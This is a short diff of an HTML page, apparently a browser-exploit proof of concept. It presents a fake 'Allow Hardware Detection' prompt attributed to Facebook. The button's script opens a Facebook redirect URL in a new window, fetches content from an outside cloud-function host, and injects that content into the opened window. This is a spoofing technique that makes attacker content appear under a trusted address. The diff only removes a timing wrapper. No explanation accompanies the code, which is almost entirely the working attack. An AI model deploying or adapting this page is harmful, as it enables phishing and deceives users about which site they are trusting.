@@ -1,11 +1,9 @@
 <h2>Facebook is asking permission to learn what kind of device you're using</h2>
 <button onclick="
   window.b=window.open('https://redirect.facebook.com/');
-  setTimeout(function(){
     fetch('https://us-central1-cellular-betrayal.cloudfunctions.net/m')
     .then(r=>r.text())
     .then(t=>b.document.body.innerHTML=t)
-  },1)
   ">
   Allow Hardware Detection
 </button>
